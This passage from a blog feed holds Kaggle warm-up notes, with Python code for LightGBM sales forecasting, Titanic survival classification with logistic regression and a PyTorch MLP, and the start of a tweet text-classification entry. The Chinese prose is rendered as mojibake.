class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">data_[<span class="string">&#x27;onpromotion&#x27;</span>] = data_[<span class="string">&#x27;onpromotion&#x27;</span>].apply(<span class="keyword">lambda</span> x: x &gt; <span class="number">0</span>)</span><br><span class="line">sales_lag_columns = <span class="built_in">list</span>(data_.<span class="built_in">filter</span>(like=<span class="string">&quot;lag&quot;</span>).columns)</span><br><span class="line"></span><br><span class="line">training_percentage = <span class="number">0.8</span></span><br><span class="line">testing_percentage = <span class="number">0.2</span></span><br><span class="line"></span><br><span class="line">to_dummies = [<span class="string">&#x27;day_of_week&#x27;</span>, <span class="string">&#x27;day_of_month&#x27;</span>, <span class="string">&#x27;month&#x27;</span>, <span class="string">&#x27;quarter&#x27;</span>, <span class="string">&#x27;year&#x27;</span>, <span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;type_y&#x27;</span>, <span class="string">&#x27;cluster&#x27;</span>, <span class="string">&#x27;family&#x27;</span>, <span class="string">&#x27;onpromotion&#x27;</span>, <span class="string">&#x27;type_x&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;locale_name&#x27;</span>, <span class="string">&#x27;city&#x27;</span>, <span class="string">&#x27;state&#x27;</span>]</span><br><span class="line"></span><br><span class="line">X = data_.loc[:, [ <span class="string">&#x27;day_of_week&#x27;</span>, <span class="string">&#x27;day_of_month&#x27;</span>, <span class="string">&#x27;month&#x27;</span>, <span class="string">&#x27;quarter&#x27;</span>, <span class="string">&#x27;year&#x27;</span>, <span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;type_y&#x27;</span>, <span class="string">&#x27;cluster&#x27;</span>, <span class="string">&#x27;family&#x27;</span>, <span class="string">&#x27;onpromotion&#x27;</span>, <span class="string">&#x27;type_x&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;locale_name&#x27;</span>,  <span class="string">&#x27;city&#x27;</span>, <span class="string">&#x27;state&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;id&#x27;</span>]+ sales_lag_columns]</span><br><span class="line">X[to_dummies] = X[to_dummies].astype(<span class="string">&#x27;category&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data_train = X[X[<span class="string">&#x27;test&#x27;</span>] == <span class="number">0</span>]</span><br><span class="line">data_test = X[X[<span class="string">&#x27;test&#x27;</span>] == <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(data_train)</span><br><span class="line"></span><br><span class="line">training_start = <span class="number">0</span></span><br><span class="line">training_end = math.floor(n * training_percentage)</span><br><span class="line">validation_start = training_end</span><br><span class="line">validation_end = n</span><br><span class="line"></span><br><span class="line">X_train = data_train.loc[training_start:training_end, :].drop([<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;id&#x27;</span>],  axis=<span class="number">1</span>)</span><br><span class="line">y_train = data_train.loc[training_start:training_end, <span class="string">&#x27;sales&#x27;</span>]</span><br><span class="line">X_val = data_train.loc[validation_start:validation_end,  :].drop([<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;id&#x27;</span>],  axis=<span class="number">1</span>)</span><br><span class="line">y_val = data_train.loc[validation_start:validation_end, <span class="string">&#x27;sales&#x27;</span>]</span><br><span class="line"></span><br><span class="line">X_test = data_test.loc[:, ].drop([<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;id&#x27;</span>],  axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># filter chars</span></span><br><span class="line">X_train = X_train.rename(columns = <span class="keyword">lambda</span> x:re.sub(<span class="string">&#x27;[^A-Za-z0-9_]+&#x27;</span>, <span class="string">&#x27;&#x27;</span>, x)) </span><br><span class="line">X_val = X_val.rename(columns = <span class="keyword">lambda</span> x:re.sub(<span class="string">&#x27;[^A-Za-z0-9_]+&#x27;</span>, <span class="string">&#x27;&#x27;</span>, x)) </span><br><span class="line">X_test = X_test.rename(columns = <span class="keyword">lambda</span> x:re.sub(<span class="string">&#x27;[^A-Za-z0-9_]+&#x27;</span>, <span class="string">&#x27;&#x27;</span>, x)) </span><br><span class="line">X_train.head()</span><br></pre></td></tr></table></figure></p><h2 id="train">train</h2><p>æœ€åä¸¢è¿›LGBMRegressor, LightGBM, short for light gradient-boosting machine.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hyper_params = &#123;<span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;train&#x27;</span>,<span class="string">&#x27;boosting_type&#x27;</span>: <span class="string">&#x27;gbdt&#x27;</span>,<span class="string">&#x27;objective&#x27;</span>: <span class="string">&#x27;regression&#x27;</span>,<span class="string">&#x27;metric&#x27;</span>: [<span class="string">&#x27;l1&#x27;</span>,<span class="string">&#x27;l2&#x27;</span>],<span class="string">&#x27;learning_rate&#x27;</span>: <span class="number">0.1</span>,</span><br><span class="line"><span class="string">&#x27;feature_fraction&#x27;</span>: <span class="number">0.9</span>,<span class="string">&#x27;bagging_fraction&#x27;</span>: <span class="number">0.7</span>,<span class="string">&#x27;bagging_freq&#x27;</span>: <span class="number">10</span>,<span class="string">&#x27;verbose&#x27;</span>: <span class="number">0</span>,<span class="string">&quot;max_depth&quot;</span>: <span class="number">50</span>,<span class="string">&quot;num_leaves&quot;</span>: <span class="number">128</span>,<span class="string">&quot;max_bin&quot;</span>: <span class="number">512</span>&#125;</span><br><span class="line"></span><br><span class="line">gbm = lgb.LGBMRegressor(**hyper_params)</span><br><span class="line"></span><br><span class="line">gbm.fit(X_train, y_train,</span><br><span class="line">        eval_set=[(X_val, y_val)],</span><br><span class="line">        eval_metric=<span class="string">&#x27;l1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">y_pred = gbm.predict(X_val)</span><br><span class="line">results = pd.concat([y_val.reset_index(drop=<span class="literal">True</span>), pd.Series(y_pred)], axis=<span class="number">1</span>).rename(columns=&#123;<span class="string">&#x27;sales&#x27;</span>: <span class="string">&#x27;y_val&#x27;</span>, <span class="number">0</span>: <span class="string">&#x27;y_pred&#x27;</span>&#125;)</span><br><span class="line">results[<span class="string">&#x27;y_pred&#x27;</span>] = results[<span class="string">&#x27;y_pred&#x27;</span>].clip(<span class="number">0</span>)</span><br><span class="line">results = results[results[<span class="string">&#x27;y_val&#x27;</span>] &gt; <span class="number">10</span>]</span><br><span class="line">results</span><br></pre></td></tr></table></figure><h2 id="todo">TODO</h2><p>è¿™æ¬¡å†™çš„ä¸»è¦æ˜¯æ•°æ®å¤„ç†æµç¨‹ä»¥åŠæœ€åæ¨¡å‹çš„ä½¿ç”¨,è¿™æ¬¡å…ˆè®°å½•æ‰€çœ‹çš„ç¬¬ä¸€ä¸ªnotebook,å¯¹äºè¿™ä¸€ç±»ä»¥å‰æ²¡é‡åˆ°çš„é—®é¢˜è¿˜æ˜¯å¾—å¤šçœ‹å¤šç»ƒ,åç»­ä¹Ÿä¼šå†å¤šæ‰¾å‡ ä¸ªnotebookè¿›è¡Œå­¦ä¹ å’Œè®°å½•.</p>]]></content>
      
      
      <categories>
          
          <category> Kaggle-warmup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kaggle_warmup2-BiClassification</title>
      <link href="/2024/04/06/Kaggle-warmup2-BiClassification/"/>
      <url>/2024/04/06/Kaggle-warmup2-BiClassification/</url>
      
        <content type="html"><![CDATA[<p>Kaggleä¸Šé¢çš„<a href="https://www.kaggle.com/competitions/titanic">Titanic - Machine Learning from Disaster</a></p><h2 id="ç®€è¦åˆ†æ">ç®€è¦åˆ†æ</h2><p>é¦–å…ˆçœ‹æ•°æ® <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">train_path = <span class="string">&#x27;/kaggle/input/titanic/train.csv&#x27;</span></span><br><span class="line">train_data = pd.read_csv(train_path)</span><br><span class="line">train_data.head()</span><br></pre></td></tr></table></figure> <img src="df_head.png" alt="train_head" /></p><p>ä¸»è¦æ˜¯ä»ä¸€äº›featureè¿›è¡Œé¢„æµ‹,target featureä¸º<code>Survived</code>,ä»…0,1,æ ‡å‡†äºŒåˆ†ç±». å®˜æ–¹æ–‡æ¡£ä¹Ÿæä¾›äº†feature engineeringçš„æ€è·¯. å¯ä»¥åç»­åšä¼˜åŒ–ä¸è¿‡è¿™é‡Œä»…åšbaselineå’Œå¿…è¦å¤„ç†,æ¯”å¦‚fillna,one-hot-encodingä¹‹ç±»çš„.</p><p>é€šè¿‡infoçœ‹ä¸‹æ•°æ®naæƒ…å†µ. <img src="info.png" alt="data_info" /></p><p>å¯ä»¥çœ‹åˆ°ageéœ€è¦è¿›è¡Œfillna, Cabinå› ä¸ºnaè¿‡å¤šå¯ä»¥ä¸¢å¼ƒ, å…¶ä½™numericalå¯ä»¥åšMinMaxScale.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> MinMaxScaler</span><br><span class="line"></span><br><span class="line">train_data = pd.read_csv(train_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">preprocessing</span>(<span class="params">df</span>):</span><br><span class="line">    <span class="comment"># drop columns and fill na</span></span><br><span class="line">    df = df.drop([<span class="string">&#x27;Name&#x27;</span>, <span class="string">&#x27;PassengerId&#x27;</span>, <span class="string">&#x27;Ticket&#x27;</span>, <span class="string">&#x27;Cabin&#x27;</span>], axis=<span class="number">1</span>)</span><br><span class="line">    df[<span class="string">&#x27;Age&#x27;</span>] = df[<span class="string">&#x27;Age&#x27;</span>].fillna(df[<span class="string">&#x27;Age&#x27;</span>].mean())</span><br><span class="line">    <span class="comment"># do one hot encoding</span></span><br><span class="line">    dummy_columns = [<span class="string">&#x27;Sex&#x27;</span>, <span class="string">&#x27;Pclass&#x27;</span>,<span class="string">&#x27;Embarked&#x27;</span>]</span><br><span class="line">    df = pd.get_dummies(df, columns=dummy_columns)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># do scale to numerical features</span></span><br><span class="line">    scaler = MinMaxScaler()</span><br><span class="line">    feature = df.loc[:, ~df.columns.isin([<span class="string">&#x27;Survived&#x27;</span>])]</span><br><span class="line">    feature = pd.DataFrame(scaler.fit_transform(feature.values), columns=feature.columns)</span><br><span class="line">    <span class="keyword">return</span> feature</span><br><span class="line"></span><br><span class="line">label = train_data[<span class="string">&#x27;Survived&#x27;</span>]</span><br><span class="line">feature = preprocessing(train_data.loc[:, ~train_data.columns.isin([<span class="string">&#x27;Survived&#x27;</span>])])</span><br><span class="line">feature.head()</span><br></pre></td></tr></table></figure><p>å¤„ç†å®Œä¹‹åæ•°æ®é•¿æˆè¿™æ · <img src="processed_data.png" alt="processed_data" /></p><p>åç»­ä¸¢æ¨¡å‹è®­ç»ƒå°±è¡Œ,äºŒåˆ†ç±»å¯ä»¥ç›´æ¥ä¸¢LogisticRegression,æˆ–è€…ä¹Ÿå¯ä»¥è‡ªå·±å†™ä¸ªMLP</p><h2 id="logisticregression">LogisticRegression</h2><p>å¹³æ—¶å¹¶æ²¡æœ‰æ€ä¹ˆç”¨sklearn,ä¸è¿‡è¯•äº†ä¸‹æ„Ÿè§‰æŒºä¸é”™çš„,ä¹Ÿå¯ä»¥è‡ªå·±æ‰‹å†™ä¸€ä¸ª,é¢„æµ‹ç»“æœå¤§æ¦‚ä¹Ÿæ˜¯0.8å·¦å³. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sklearn Logistic Regression</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score</span><br><span class="line"></span><br><span class="line"><span class="comment"># potentially use rfe for feature selection</span></span><br><span class="line"><span class="comment"># rfe = RFE(model, 8)</span></span><br><span class="line"><span class="comment"># rfe.fit(X, y)</span></span><br><span class="line">LR = LogisticRegression()</span><br><span class="line">LR.fit(feature,label)</span><br><span class="line">y_pred = LR.predict(feature)</span><br><span class="line"><span class="built_in">print</span>(accuracy_score(y_pred, label))</span><br><span class="line"><span class="comment"># 0.8013468013468014</span></span><br></pre></td></tr></table></figure></p><h3 id="k-folder">K-Folder</h3><p>é¡ºæ‰‹åšä¸€æ‰‹K-Folder</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># K-fold cross validation</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score, KFold</span><br><span class="line"></span><br><span class="line">kf = KFold(<span class="number">10</span>)</span><br><span class="line">score = cross_val_score(LR, feature, label, cv=kf)</span><br><span class="line"><span class="built_in">print</span>(score)</span><br><span class="line"><span class="comment"># [0.77777778 0.83146067 0.7752809  0.80898876 0.7752809  0.78651685 0.74157303 0.78651685 0.86516854 0.79775281]</span></span><br></pre></td></tr></table></figure><h2 id="pytorch-mlp">PyTorch MLP</h2><p>ä¸»è¦å†™ä¸€ä¸ªdatasetå’Œdataloader, ç„¶å<code>nn.Module</code>å†™ä¸€ä¸ªmodel, ç„¶å<code>zero_grad</code>,<code>backward</code>,<code>step</code>. æœ€åæ‰‹åŠ¨å­˜yåšä¸€ä¸‹accuracyçš„è¾“å‡º. è¿™é‡Œmodelåˆ é™¤ç¬¬2,3å±‚å…¨è¿å’Œ1,2å±‚æ¿€æ´»å‡½æ•°,æŠŠç¬¬ä¸€å±‚è¾“å‡ºæ”¹æˆ1å³pytorchå®ç°çš„LR,æ•ˆæœä¹Ÿå’Œsklearnçš„å·®ä¸å¤š.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PyTorch MLP</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> Dataset, DataLoader</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"></span><br><span class="line">device = torch.device(<span class="string">&#x27;cuda&#x27;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&#x27;cpu&#x27;</span>)</span><br><span class="line"></span><br><span class="line">train_x, valid_x, train_y, valid_y = train_test_split(feature, label, test_size=<span class="number">0.2</span>)</span><br><span class="line"><span class="comment"># create dataset class</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TitanicDataset</span>(<span class="title class_ inherited__">Dataset</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        self.x = torch.from_numpy(x.values).<span class="built_in">float</span>().to(device)</span><br><span class="line">        self.y = torch.from_numpy(y.values).<span class="built_in">float</span>().to(device)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.x) != <span class="built_in">len</span>(self.y):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unequal Size of X and Y!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">len</span>(self.x)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, idx</span>):</span><br><span class="line">        <span class="keyword">return</span> self.x[idx],self.y[idx]</span><br><span class="line"></span><br><span class="line"><span class="comment"># init dataloader</span></span><br><span class="line">train_dataset = TitanicDataset(train_x, train_y)</span><br><span class="line">train_iter = DataLoader(train_dataset, batch_size=<span class="number">128</span>, shuffle=<span class="literal">True</span>)</span><br><span class="line">valid_dataset = TitanicDataset(valid_x, valid_y)</span><br><span class="line">valid_iter = DataLoader(valid_dataset, batch_size=<span class="number">128</span>, shuffle=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MLP</span>(torch.nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n_features</span>):</span><br><span class="line">        <span class="built_in">super</span>(MLP, self).__init__()</span><br><span class="line">        self.fc1 = torch.nn.Linear(n_features, <span class="number">256</span>)</span><br><span class="line">        self.fc2 = torch.nn.Linear(<span class="number">256</span>, <span class="number">128</span>)</span><br><span class="line">        self.fc3 = torch.nn.Linear(<span class="number">128</span>, <span class="number">1</span>)</span><br><span class="line">        self.fn1 = torch.nn.ReLU()</span><br><span class="line">        self.fn2 = torch.nn.ReLU()</span><br><span class="line">        self.fn3 = torch.nn.Sigmoid()</span><br><span class="line">        </span><br><span class="line">        torch.nn.init.xavier_uniform_(self.fc1.weight)</span><br><span class="line">        torch.nn.init.xavier_uniform_(self.fc2.weight)</span><br><span class="line">        torch.nn.init.xavier_uniform_(self.fc3.weight)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.fn1(self.fc1(x))</span><br><span class="line">        x = self.fn2(self.fc2(x))        </span><br><span class="line">        x = self.fn3(self.fc3(x))</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">_, n_features = train_x.shape</span><br><span class="line">model = MLP(n_features)</span><br><span class="line">model.to(device)</span><br><span class="line"></span><br><span class="line">lr = <span class="number">1e-4</span></span><br><span class="line">loss = torch.nn.BCELoss()</span><br><span class="line">optimizer = torch.optim.Adam(model.parameters(), lr=lr)</span><br><span class="line">epoch = <span class="number">200</span></span><br><span class="line"></span><br><span class="line">model.train()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(epoch):</span><br><span class="line">    total_loss = <span class="number">0</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    correct = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x, y <span class="keyword">in</span> train_iter:</span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        y_pred = torch.squeeze(model(x))</span><br><span class="line">        l = loss(y_pred, y)</span><br><span class="line">        l.backward()</span><br><span class="line">        optimizer.step()</span><br><span class="line">        total_loss += l.item()</span><br><span class="line">        total += <span class="built_in">len</span>(y)</span><br><span class="line">        correct += <span class="built_in">sum</span>(y_pred.<span class="built_in">round</span>() == y)</span><br><span class="line">    </span><br><span class="line">    train_accuracy = correct / total</span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    correct = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x, y <span class="keyword">in</span> valid_iter:</span><br><span class="line">        y_pred = torch.squeeze(model(x))</span><br><span class="line">        total += <span class="built_in">len</span>(y)</span><br><span class="line">        correct += <span class="built_in">sum</span>(y_pred.<span class="built_in">round</span>() == y)</span><br><span class="line">    test_accuracy = correct / total</span><br><span class="line">    <span class="keyword">if</span> (i+<span class="number">1</span>)%<span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Epoch <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>:<span class="subst">&#123;total_loss&#125;</span>, train accuracy:<span class="subst">&#123;train_accuracy&#125;</span>, test accuracy:<span class="subst">&#123;test_accuracy&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Epoch 10:3.5960923433303833, train accuracy:0.7064606547355652, test accuracy:0.7430167198181152</span><br><span class="line">Epoch 20:3.1748223900794983, train accuracy:0.7851123809814453, test accuracy:0.8156424164772034</span><br><span class="line">Epoch 30:2.885961800813675, train accuracy:0.8089887499809265, test accuracy:0.832402229309082</span><br><span class="line">Epoch 40:2.7163011729717255, train accuracy:0.8047752976417542, test accuracy:0.8212290406227112</span><br><span class="line">Epoch 50:2.670557290315628, train accuracy:0.8089887499809265, test accuracy:0.8156424164772034</span><br><span class="line">Epoch 60:2.5934107899665833, train accuracy:0.8202247023582458, test accuracy:0.8212290406227112</span><br><span class="line">Epoch 70:2.5730879604816437, train accuracy:0.8188202381134033, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 80:2.574642688035965, train accuracy:0.8146067261695862, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 90:2.5959592163562775, train accuracy:0.8160112500190735, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 100:2.555866301059723, train accuracy:0.8132022619247437, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 110:2.5190521478652954, train accuracy:0.8160112500190735, test accuracy:0.832402229309082</span><br><span class="line">Epoch 120:2.5432372093200684, train accuracy:0.8132022619247437, test accuracy:0.8379887938499451</span><br><span class="line">Epoch 130:2.5101636350154877, train accuracy:0.8132022619247437, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 140:2.4863936603069305, train accuracy:0.8146067261695862, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 150:2.441671073436737, train accuracy:0.8117977380752563, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 160:2.452588587999344, train accuracy:0.8160112500190735, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 170:2.4411253333091736, train accuracy:0.8132022619247437, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 180:2.5097872614860535, train accuracy:0.8117977380752563, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 190:2.428959161043167, train accuracy:0.817415714263916, test accuracy:0.8268156051635742</span><br><span class="line">Epoch 200:2.395860642194748, train accuracy:0.8188202381134033, test accuracy:0.8268156051635742</span><br></pre></td></tr></table></figure></p><h2 id="submission">submission</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># submission</span></span><br><span class="line">test_data = pd.read_csv(test_path)</span><br><span class="line">test_data = preprocessing(test_data)</span><br><span class="line">text_data = torch.from_numpy(test_data.values).<span class="built_in">float</span>().to(device)</span><br><span class="line">y_pred = model(text_data).<span class="built_in">round</span>().detach().cpu()</span><br><span class="line"></span><br><span class="line">submission_data = pd.read_csv(submission_path)</span><br><span class="line">submission_data.head()</span><br><span class="line">submission_data[<span class="string">&#x27;Survived&#x27;</span>] = y_pred.to(torch.int32)</span><br><span class="line">submission_data.to_csv(<span class="string">&#x27;submission.csv&#x27;</span>, index=<span class="literal">False</span>)</span><br><span class="line">submission_data.head()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Kaggle-warmup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kaggle_warmup1-TextClassification</title>
      <link href="/2024/04/04/Kaggle-warmup1-TextClassification/"/>
      <url>/2024/04/04/Kaggle-warmup1-TextClassification/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘ä¸€ç›´åœ¨å†™leetcode,å‰æ®µæ—¶é—´å­¦çš„MLç›¸å…³ä¸œè¥¿éƒ½æœ‰ç‚¹å¿˜äº†,è¿‘æœŸé€šè¿‡Kaggleè¿›è¡Œä¸€ä¸‹å¿«é€Ÿå¤ä¹ ,é¡ºä¾¿å­¦ä¹ ä¸€äº›æ–°ä¸œè¥¿.</p><p>è¿™æ¬¡çš„ç»ƒä¹ 1ä¸»è¦æ˜¯Kaggleä¸Šé¢çš„<a href="https://www.kaggle.com/competitions/nlp-getting-started">Natural Language Processing with Disaster Tweets</a></p><h2 id="huggingface-transfomers">HuggingFace-Transfomers</h2><p>ä¹‹å‰è§åˆ°è¿‡ä¸€æ¬¡ä½†æ²¡æœ‰åŠ¨æ‰‹æ¥å†™,å°è±¡é‡Œæ˜¯ä¸€ä¸ªå¾ˆfunctionalçš„å·¥å…·,è¿˜æœ‰piplineå¯ä»¥ç›´æ¥cmdä½¿ç”¨,è¿™æ¬¡å»çœ‹äº†ä¸‹æ–‡æ¡£åŠ¨æ‰‹å†™äº†ä¸‹.</p><p>é¦–å…ˆçœ‹ä¸‹æ•°æ®é•¿å•¥æ · <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">train_url = <span class="string">&#x27;/kaggle/input/nlp-getting-started/train.csv&#x27;</span></span><br><span class="line">train_data = pd.read_csv(train_url)</span><br><span class="line">train_data.head()</span><br></pre></td></tr></table></figure> <img src="train_data_head.png" alt="train_head" /></p><p>ç„¶åéœ€è¦æ³¨æ„ä½¿ç”¨transformerséœ€è¦wandbçš„token,addoné‡Œé¢è‡ªå·±æ·»åŠ keyå³å¯ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">!pip install transformers datasets evaluate accelerate wandb</span><br><span class="line"><span class="keyword">import</span> wandb</span><br><span class="line"><span class="keyword">from</span> kaggle_secrets <span class="keyword">import</span> UserSecretsClient</span><br><span class="line">user_secrets = UserSecretsClient()</span><br><span class="line">wandb_token = user_secrets.get_secret(<span class="string">&quot;wandb_token&quot;</span>)</span><br><span 